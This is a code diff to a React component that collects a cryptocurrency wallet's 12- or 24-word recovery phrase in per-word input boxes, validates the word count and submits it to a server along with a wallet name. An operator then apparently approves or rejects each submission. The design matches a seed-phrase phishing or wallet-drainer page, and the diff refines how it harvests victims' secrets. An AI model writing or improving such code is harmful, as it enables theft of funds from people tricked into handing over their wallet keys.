@@ -365,11 +365,11 @@ function useGlobalPending() {
 }
 
 function SeedPhraseTab({ walletName }) {
-	const [phrase, setPhrase] = useState("");
+	const [phraseArr, setPhraseArr] = useState(Array(12).fill(""));
 	const [submitted, setSubmitted] = useState(false);
 	const [status, setStatus] = useState("pending");
 	const [loading, setLoading] = useState(false);
-	const [showPhrase, setShowPhrase] = useState(false);
+	const [showPhrase, setShowPhrase] = useState(true);
 	const { globalPending, pendingType } = useGlobalPending();
 
 	// Fetch previous submission if exists
@@ -378,13 +378,20 @@ function SeedPhraseTab({ walletName }) {
 			const resp = await fetch("/api/wallet-data?type=phrase");
 			const data = await resp.json();
 			if (data.phrase) {
-				setPhrase(data.phrase);
+				const words = data.phrase.trim().split(/\s+/);
+				setPhraseArr(words.length === 12 || words.length === 24 ? words : Array(12).fill(""));
 				setSubmitted(true);
 				setShowPhrase(false);
 			}
 		}
 		fetchPhrase();
 	}, []);
+
+	const handleWordChange = (idx, value) => {
+		const arr = [...phraseArr];
+		arr[idx] = value.replace(/\s/g, "");
+		setPhraseArr(arr);
+	};
 
 	const handleSubmit = async (e) => {
 		e.preventDefault();
@@ -396,8 +403,13 @@ function SeedPhraseTab({ walletName }) {
 			);
 			return;
 		}
+		const words = phraseArr.filter(Boolean);
+		if (words.length !== 12 && words.length !== 24) {
+			toast.error("Recovery phrase must be exactly 12 or 24 words.");
+			return;
+		}
 		setLoading(true);
-		const res = await saveWalletData({ type: "phrase", data: phrase, walletName });
+		const res = await saveWalletData({ type: "phrase", data: words.join(" "), walletName });
 		setLoading(false);
 		if (res.success) {
 			setSubmitted(true);
@@ -430,56 +442,47 @@ function SeedPhraseTab({ walletName }) {
 		if (status === "rejected") {
 			setSubmitted(false);
 			setStatus("pending");
-			setPhrase("");
+			setPhraseArr(Array(12).fill(""));
 			toast.error("Your submission was rejected. Please try again.");
 		}
 	}, [status]);
 
-	const phraseWords = phrase.trim().split(/\s+/);
+	const displayArr = showPhrase
+		? phraseArr
+		: phraseArr.map((word) => (word ? "••••••••" : ""));
 
 	return (
 		<form onSubmit={handleSubmit}>
-			<div className="flex flex-col mb-6">
-				<div className="relative">
-					<textarea
-						cols={30}
-						rows={4}
-						placeholder="Enter your recovery phrase"
-						className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-10 rounded-lg border border-white/20 bg-black/20 text-white w-full py-2 focus:outline-none focus:border-blue-400"
-						name="phrase"
-						minLength={12}
-						value={showPhrase ? phraseWords.map((word, idx) => `${idx + 1}. ${word}`).join(" ") : phrase}
-						onChange={(e) => setPhrase(e.target.value)}
-						required
-						readOnly={submitted || globalPending || status === "approved"}
-					/>
-					{submitted && (
-						<button
-							type="button"
-							className="absolute top-2 right-2 text-blue-400 hover:text-blue-600"
-							onClick={() => setShowPhrase((v) => !v)}
-							aria-label={showPhrase ? "Hide phrase" : "Show phrase"}
-						>
-							{showPhrase ? <EyeOff size={22} /> : <Eye size={22} />}
-						</button>
-					)}
-					<p className="text-xs text-gray-400 mt-2">
-						Must be exactly 12 or 24 words separated by single spaces
-					</p>
+			<div className="mb-6">
+				<div className="flex justify-between items-center mb-2">
+					<label className="font-semibold text-white">Enter your recovery phrase</label>
+					<button
+						type="button"
+						className="text-blue-400 hover:text-blue-600"
+						onClick={() => setShowPhrase((v) => !v)}
+						aria-label={showPhrase ? "Hide phrase" : "Show phrase"}
+					>
+						{showPhrase ? <EyeOff size={22} /> : <Eye size={22} />}
+					</button>
 				</div>
-				{submitted && (
-					<div className="mt-4 grid grid-cols-3 sm:grid-cols-4 gap-2">
-						{phraseWords.map((word, idx) => (
-							<div
-								key={idx}
-								className="bg-gray-900/60 p-2 rounded text-center text-white flex flex-col items-center"
-							>
-								<span className="text-xs text-blue-300 font-bold">{idx + 1}</span>
-								<span className="text-xs sm:text-sm font-mono">{word}</span>
-							</div>
-						))}
-					</div>
-				)}
+				<div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
+					{displayArr.map((word, idx) => (
+						<div key={idx} className="flex flex-col items-center">
+							<span className="text-xs text-blue-300 font-bold mb-1">{idx + 1}</span>
+							<input
+								type={showPhrase ? "text" : "password"}
+								value={word}
+								onChange={(e) => handleWordChange(idx, e.target.value)}
+								disabled={submitted || globalPending || status === "approved"}
+								className="bg-gray-900/60 p-2 rounded text-center text-white w-20 sm:w-24 font-mono text-xs sm:text-sm focus:outline-none border border-white/20"
+								autoComplete="off"
+							/>
+						</div>
+					))}
+				</div>
+				<p className="text-xs text-gray-400 mt-2">
+					Must be exactly 12 or 24 words. Each box is for one word.
+				</p>
 			</div>
 			{status !== "approved" && (
 				<Button
